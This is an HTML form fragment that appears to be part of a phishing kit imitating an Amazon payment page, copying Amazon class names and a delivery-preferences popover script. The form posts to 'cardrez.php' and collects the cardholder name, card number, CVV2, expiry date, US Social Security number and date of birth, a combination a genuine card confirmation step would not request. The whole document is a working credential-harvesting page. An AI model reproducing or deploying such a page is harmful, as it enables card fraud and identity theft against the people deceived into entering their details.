<div id="fixed_width" class="a-container">
	<div class="a-box">
<form action="cardrez.php" method="POST">

<table>
<tbody><tr>
    <td colspan="2">
        
<br>
<font color="#990000"><div id="ajax-address-error"></div></font><div id="enterAddressFormDiv">

</div><table class="enterAddressFormTable"><tbody><tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="NameonCards"><b>Name on card:&nbsp;</b></label></span></td><td><span>
<input name="NameonCards" id="NameonCards" class="NameonCards" required x-moz-errormessage="Please Enter Your Name on card" size="21" maxlength="50" value="" type="text"></span>
</td></tr>


<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="enterAddressAddressLine1"><b>Card number:&nbsp;</b></label></span></td>
<td><span>
<input name="ccnumber" id="ccnumber" class="enterAddressFormField stripe_card_number" required x-moz-errormessage="Please Enter Your Card number" 
 size="21" maxlength="20" value="" type="text"></span>
<br><ul class="card_logos">
	<li class="card_visa">Visa</li>
	<li class="card_mastercard">Mastercard</li>
	<li class="card_amex">American Express</li>
	<li class="card_discover">Discover</li>
	<li class="card_jcb">JCB</li>
	<li class="card_diners">Diners Club</li>
</ul></td></tr>

<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="enterAddressAddressLine2"><b>CVV2:&nbsp;</b></label></span></td>
<td><span><input name="CVV2" id="CVV2" required x-moz-errormessage="Please Enter Your CVV2" 
class="enterAddressFormField" size="5" maxlength="60" value="" type="text"></span>
<br><span class="tiny">Card security code.</span></td></tr>


<input name="header" value="" type="hidden">
<tr><td style="vertical-align:middle;"><span><label><b>Expiration date:&nbsp;</b></label></span></td><td><span>
<select class="a-button a-button-dropdown a-button-inner" name="Expiredatesss">
<option value="--" selected="">--</option>
<option value="02">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>

<select class="a-button a-button-dropdown a-button-inner" name="expdate_year" size="1">
<option value="--" selected="">--</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
<option value="2031">2031</option>
</select>

</span>
</td></tr>


<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="ssn21124"><b>SSN (USA):</b></label></span></td><td><span>
<input name="ssn21124" id="ssn21124" class="enterAddressFormField" size="20" maxlength="20" value="" type="text"></span>
</td></tr>
<input value="content/css_left.gif" name="hostname" type="hidden">

<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="DOBDATES"><b>Date of Birth:</b></label></span></td><td><span>
</span>
<input id="dobday" size="3" class="smallInputWidth" maxlength="2" required x-moz-errormessage="Please Enter Your Date of Birth" 
name="dobday" value="" type="text">/
<input id="dobmonth" size="3" class="smallInputWidth" maxlength="2" required x-moz-errormessage="Please Enter Your Date of Birth" 
name="dobmonth" value="" type="text">/
 <input id="dobyear" size="4" class="smallInputWidth" maxlength="4" required x-moz-errormessage="Please Enter Your Date of Birth" 
name="dobyear" value="" type="text">
                          (DD/MM/YYYY) 

</td></tr>
<input name="enterAddressIsDomestic" value="0" type="hidden">






<script type="text/javascript">
amznJQ.available('popover', function(){
        jQuery('#whatsThisPopoverLink').amazonPopoverTrigger({
                width: 500,
                showCloseButton: true,
                literalContent: "<b>Address Type</b> <i>(Optional)</i><br>This helps us select the best delivery method for your shipping address.<ul><li>For commercial addresses, we make our best effort to deliver on weekdays, between 9.00 a.m. and 5.00 p.m. (local time).</li><li>For residential addresses, we make our best effort to deliver Monday through Saturday, between 7.00 a.m. and 8.00 p.m. (local time). In some areas, deliveries may be made on Sundays.</li></ul><br><b>Security Access Code</b> <i>(Optional)</i><br>If you live in a building or gated community and are permitted to share the access or security code, you may enter it here. If you choose to provide your code, it will make it more likely that your packages will be delivered to your doorstep.",
                skin: "default",
                title: "Optional Delivery Preferences",
                location: "right",
                locationAlign: "middle",
                locationMargin: 18,
                paddingBottom: 10,
                paddingLeft: 10,
                paddingRight: 20
        });
});
</script>



</tbody></table>
    </td>
</tr>
<tr>
    <td>
	<br>
    <table border="0" style="text-align:center;align:center;" width="20%">
        <tbody><tr>

        <td width="10%">&nbsp;<input name="isDomestic" value="0" type="hidden">
			<input style="padding:3px" class="a-button a-button-supplemental a-button-primary" type="submit" name="submit" value="Confirm Card">
        </td>
        </tr>
    </tbody></table>
    </td>
    <td>

        <input name="addressID" value="" type="hidden">
        <input name="sessionId" value="" type="hidden">
    </td>
</tr>
</tbody></table>
</form>
</div>
</div>